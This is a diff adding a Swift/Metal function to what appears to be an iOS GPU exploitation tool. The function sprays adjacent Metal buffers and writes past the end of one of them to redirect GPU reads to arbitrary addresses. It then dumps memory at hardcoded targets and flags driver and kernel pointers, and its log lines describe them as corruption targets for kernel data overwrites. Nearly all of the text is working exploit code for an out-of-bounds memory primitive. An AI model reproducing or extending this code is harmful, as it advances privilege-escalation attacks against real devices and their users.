@@ -3456,6 +3456,119 @@ func runIOSurfaceGPUWrite(log: FuzzLog, completion: @escaping () -> Void) {
     }
 }
 
+// ── runGPUStructDump ──────────────────────────────────────────────────────────
+// Full 512-byte hex dump of up to 3 target GPU VAs.
+// Reads 64 x UInt64 per target (8-byte stride) via the Probe/multiScan pattern.
+// Identifies pointer-shaped values (0x1400000000–0x1600000000 GPU range,
+// or 0x0–0x800000000 CPU user range) for exploitation.
+// ─────────────────────────────────────────────────────────────────────────────
+func runGPUStructDump(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        func step(_ s: String) { log.append(s) }
+        step("── GPU Struct Dump ──")
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
+        let BUF_LEN  = 4096
+        let NTHREADS = 64
+
+        // Known hit VAs from scanner — edit these if scan results change
+        let targets: [(va: UInt64, label: String)] = [
+            (0x1500006000, "hit0 CPU-ptr struct"),
+            (0x1500007000, "hit1 packed desc"),
+            (0x1500088000, "hit2 flags word"),
+        ]
+
+        // Spray → lo/hi pair
+        var loRef: MTLBuffer?
+        var nextGPUVA: UInt64 = 0
+        var keepAlives: [any MTLBuffer] = []
+        for _ in 0..<2048 {
+            guard let a = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
+            if let prev = keepAlives.last, a.gpuAddress == prev.gpuAddress + UInt64(BUF_LEN) {
+                loRef = prev; nextGPUVA = a.gpuAddress; break
+            }
+            keepAlives.append(a)
+        }
+        guard let lo = loRef else { step("✗ spray miss"); completion(); return }
+        step("✓ lo=0x\(String(lo.gpuAddress, radix: 16))")
+        let loPtr = lo.contents().assumingMemoryBound(to: UInt8.self)
+
+        guard let hi  = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
+              let out = device.makeBuffer(length: NTHREADS * 8, options: .storageModeShared) else {
+            step("✗ hi/out alloc"); completion(); return
+        }
+        step("hi=0x\(String(hi.gpuAddress, radix: 16)) \(hi.gpuAddress == nextGPUVA ? "✓" : "⚠")")
+
+        func oobWriteVA(_ idx: Int, _ va: UInt64) {
+            let off = idx * 8
+            for bi in 0..<8 { loPtr[BUF_LEN+off+bi] = UInt8((va >> (bi*8)) & 0xFF) }
+        }
+
+        // multiScan kernel: thread tid reads from probes[tid].buf[0]
+        let kernSrc = """
+        #include <metal_stdlib>
+        using namespace metal;
+        struct Probe { device ulong* buf; };
+        kernel void multiScan(device Probe* probes [[buffer(0)]],
+                              device ulong* out    [[buffer(1)]],
+                              uint tid [[thread_position_in_grid]]) {
+            out[tid] = probes[tid].buf[0];
+        }
+        """
+        guard let lib = try? device.makeLibrary(source: kernSrc, options: nil),
+              let fn  = lib.makeFunction(name: "multiScan"),
+              let pso = try? device.makeComputePipelineState(function: fn) else {
+            step("✗ multiScan PSO"); completion(); return
+        }
+
+        for tgt in targets {
+            step("── dump: \(tgt.label) base=0x\(String(tgt.va, radix: 16)) ──")
+            // Dispatch in two rounds of 64 threads: covers 128 x 8 = 1024 bytes total
+            for round in 0..<2 {
+                let roundBase = tgt.va + UInt64(round) * UInt64(NTHREADS) * 8
+                for t in 0..<NTHREADS {
+                    // Each thread reads at roundBase + t*8 (8-byte stride)
+                    // We set probes[t].buf = roundBase + t*8 → GPU reads that address
+                    oobWriteVA(t, roundBase + UInt64(t) * 8)
+                }
+                out.contents().initializeMemory(as: UInt64.self, repeating: 0xEE, count: NTHREADS)
+                guard let q   = device.makeCommandQueue(),
+                      let cb  = q.makeCommandBuffer(),
+                      let enc = cb.makeComputeCommandEncoder() else { continue }
+                enc.setComputePipelineState(pso)
+                enc.setBuffer(hi,  offset: 0, index: 0)
+                enc.setBuffer(out, offset: 0, index: 1)
+                let sz = MTLSize(width: NTHREADS, height: 1, depth: 1)
+                enc.dispatchThreads(sz, threadsPerThreadgroup: sz)
+                enc.endEncoding()
+                cb.commit(); cb.waitUntilCompleted()
+                if cb.error != nil { step("  round\(round) FAULT"); continue }
+
+                let outPtr = out.contents().assumingMemoryBound(to: UInt64.self)
+                for t in 0..<NTHREADS {
+                    let addr = roundBase + UInt64(t) * 8
+                    let val  = outPtr[t]
+                    if val == 0 { continue }   // skip zeroes to keep log tight
+                    let label: String
+                    if (0x1400000000...0x1600000000).contains(val) {
+                        label = "← GPU VA ptr ★"
+                    } else if val < 0x800000000 {
+                        label = "← CPU user VA ptr"
+                    } else if val > 0xFFFFFE0000000000 {
+                        label = "← kernel VA ptr ★★"
+                    } else {
+                        label = ""
+                    }
+                    step("  +\(String(format: "%04x", addr - tgt.va))  0x\(String(val, radix: 16))  \(label)")
+                }
+            }
+        }
+        step("── GPU Struct Dump complete ──")
+        step("  ★ GPU VA ptr (0x14xx/0x15xx) = Metal driver pointer we can corrupt with write redirect")
+        step("  ★★ kernel VA ptr (0xFFFFFExx) = direct kernel pointer — write → kernel data corruption")
+        completion()
+    }
+}
+
 // ── runGPUVAScan ──────────────────────────────────────────────────────────────
 // Sweep GPU VA space with the read redirect primitive to locate Metal driver /
 // kernel-mapped regions not visible from userspace.
